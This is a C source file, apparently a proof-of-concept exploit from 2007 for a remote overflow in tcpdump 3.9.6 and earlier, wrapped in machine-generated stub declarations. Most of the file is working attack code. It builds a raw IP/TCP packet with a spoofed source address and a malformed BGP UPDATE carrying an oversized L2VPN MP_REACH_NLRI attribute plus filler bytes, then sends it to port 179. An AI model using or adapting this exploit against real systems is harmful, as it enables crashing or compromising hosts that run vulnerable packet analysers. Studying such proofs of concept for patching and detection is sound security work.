#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_6__   TYPE_3__ ;
typedef  struct TYPE_5__   TYPE_2__ ;
typedef  struct TYPE_4__   TYPE_1__ ;

/* Type definitions */
struct tcphdr {int th_off; scalar_t__ th_urp; scalar_t__ th_sum; void* th_win; int /*<<< orphan*/  th_flags; scalar_t__ th_x2; scalar_t__ th_ack; int /*<<< orphan*/  th_seq; void* th_dport; void* th_sport; } ;
struct TYPE_6__ {void* s_addr; } ;
struct sockaddr_in {TYPE_3__ sin_addr; void* sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct TYPE_5__ {void* s_addr; } ;
struct TYPE_4__ {void* s_addr; } ;
struct ip {int ip_hl; int ip_v; int ip_ttl; int ip_p; scalar_t__ ip_sum; TYPE_2__ ip_dst; TYPE_1__ ip_src; scalar_t__ ip_off; void* ip_id; void* ip_len; scalar_t__ ip_tos; } ;
typedef  int /*<<< orphan*/  sin ;

/* Variables and functions */
 int AFNUM_L2VPN ; 
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  BGPTYPE_MP_REACH_NLRI ; 
 int /*<<< orphan*/  EXIT_FAILURE ; 
 int EXIT_SUCCESS ; 
 int /*<<< orphan*/  IPPROTO_IP ; 
 int /*<<< orphan*/  IPPROTO_TCP ; 
 int /*<<< orphan*/  IP_HDRINCL ; 
 int /*<<< orphan*/  PF_INET ; 
 int PKT_LEN ; 
 int PORT_BGP ; 
 int /*<<< orphan*/  SAFNUM_VPNUNICAST ; 
 int /*<<< orphan*/  SOCK_RAW ; 
 int /*<<< orphan*/  TH_PUSH ; 
 int /*<<< orphan*/  exit (int /*<<< orphan*/ ) ; 
 void* htonl (int) ; 
 void* htons (int) ; 
 void* inet_addr (char*) ; 
 scalar_t__ ip_sum (unsigned short*,int) ; 
 int /*<<< orphan*/  memset (char*,int,int) ; 
 int /*<<< orphan*/  perror (char*) ; 
 int /*<<< orphan*/  printf (char*) ; 
 int /*<<< orphan*/  rand () ; 
 scalar_t__ sendto (int,char*,int,int /*<<< orphan*/ ,struct sockaddr*,int) ; 
 scalar_t__ setsockopt (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int*,int) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 

int 
main (void)
{
  int raw_fd, opt_val, *popt_val;
  char buf[4096], *ptr;
  struct ip *iph;
  struct tcphdr *tcph;
  struct sockaddr_in sin;

  printf ("tcpdump <= 3.9.6 BGP UPDATE remote overflow POC\n"
          "by mu-b <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");

  if ((raw_fd = socket (PF_INET, SOCK_RAW, IPPROTO_TCP)) < 0)
    {
      perror ("socket ()");
      exit (EXIT_FAILURE);
    }

  opt_val = 1;
  popt_val = &opt_val;
  if (setsockopt (raw_fd, IPPROTO_IP, IP_HDRINCL, popt_val, sizeof opt_val) < 0)
    {
      perror ("setsockopt ()");
      exit (EXIT_FAILURE);
    }

  sin.sin_family = AF_INET;
  sin.sin_port = htons (PORT_BGP);
  sin.sin_addr.s_addr = inet_addr ("127.0.0.1");

  memset (buf, 0, 4096);

  iph = (struct ip *) buf;
  iph->ip_hl = 5;
  iph->ip_v = 4;
  iph->ip_tos = 0;
  iph->ip_len = htons (sizeof (struct ip) + sizeof (struct tcphdr) + PKT_LEN);
  iph->ip_id = htonl (54321);
  iph->ip_off = 0;
  iph->ip_ttl = 255;
  iph->ip_p = 6;
  iph->ip_sum = 0;
  iph->ip_src.s_addr = inet_addr ("1.2.3.4");
  iph->ip_dst.s_addr = sin.sin_addr.s_addr;
  iph->ip_sum = ip_sum ((unsigned short *) buf, sizeof (struct ip));

  tcph = (struct tcphdr *) (buf + sizeof (struct ip));
  tcph->th_sport = htons (65535);
  tcph->th_dport = htons (PORT_BGP);
  tcph->th_seq = rand ();
  tcph->th_ack = 0;
  tcph->th_x2 = 0;
  tcph->th_off = sizeof (struct tcphdr) / 4;
  tcph->th_flags = TH_PUSH;
  tcph->th_win = htonl (65535);
  tcph->th_sum = 0;
  tcph->th_urp = 0;

  ptr = buf + sizeof (struct ip) + sizeof (struct tcphdr);
  
  memset (ptr, 0xFF, 16);           /* marker */
   ptr  += 16;
  *ptr++ = 0x02;                    /* length */
  *ptr++ = 0x00;
  *ptr++ = 0x02;                    /* type = BGP_UPDATE */
  *ptr++ = 0x00;                    /* length */
  *ptr++ = 0x00;
  *ptr++ = 0x00;                    /* length */
  *ptr++ = 0xFF;

  *ptr++ = 0x00;                    /* attr flags */
  *ptr++ = BGPTYPE_MP_REACH_NLRI;   /* attr type */
  *ptr++ = 0xFF;                    /* attr length */

  *ptr++ = (AFNUM_L2VPN << 8) & 0xFF;
  *ptr++ = AFNUM_L2VPN & 0xFF;
  *ptr++ = SAFNUM_VPNUNICAST;
  *ptr++ = 0x00;                    /* Next-HOP */
  *ptr++ = 0x00;                    /* SNPA */

  /* decode_labeled_vpn_l2 */
  *ptr++ = 0xFF;                    /* tlen = plen */
  *ptr++ = 0xFF;
  memset (ptr, 0xFF, 15);           /* marker */
   ptr  += 15;
  *ptr++ = 0x01;                    /* type */
  *ptr++ = 0x02;                    /* len */
  *ptr++ = 0x50;

  memset (ptr, 0x41, PKT_LEN);

  if (sendto (raw_fd, buf, sizeof (struct ip) + sizeof (struct tcphdr) + PKT_LEN, 0,
              (struct sockaddr *) &sin, sizeof (sin)) < 0)
    {
      perror ("sendto ()");
      exit (EXIT_FAILURE);
    }

  return (EXIT_SUCCESS);
}